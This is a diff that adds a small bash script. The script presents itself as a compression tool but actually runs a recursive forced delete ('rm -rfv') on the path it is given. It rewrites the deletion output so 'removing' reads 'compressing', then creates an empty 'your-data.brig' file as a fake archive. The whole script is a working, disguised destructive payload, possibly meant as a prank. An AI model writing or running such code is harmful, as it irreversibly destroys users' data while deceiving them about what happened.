@@ -1,0 +1,11 @@
+#!/bin/bash
+
+if ls --version 2>/dev/null | grep -q 'coreutils'; then
+	#We are GNU
+  		rm -rfv $1 | sed --expression="s/removing/compressing/g"
+else
+	#we are BSD
+  		rm -rfv $1 | while read line; do echo "compressing $line"; done
+fi
+
+touch your-data.brig
